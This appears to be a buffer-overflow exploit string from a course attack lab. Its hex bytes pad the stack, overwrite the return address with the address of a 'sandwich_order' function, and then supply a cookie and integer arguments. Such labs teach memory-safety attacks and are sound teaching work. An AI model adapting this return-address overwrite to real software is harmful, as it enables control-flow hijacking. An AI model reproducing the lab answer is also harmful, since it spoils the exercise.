00 00 00 00 00 00 00 00 /* junk to overflow */
d0 10 40 00 00 00 00 00 /* address to sandwich_order */
00 00 00 00 00 00 00 00 /* junk to reach arg1 */
d1 9c b2 3f /* cookie */
02 03 04 05 /* integer inputs */
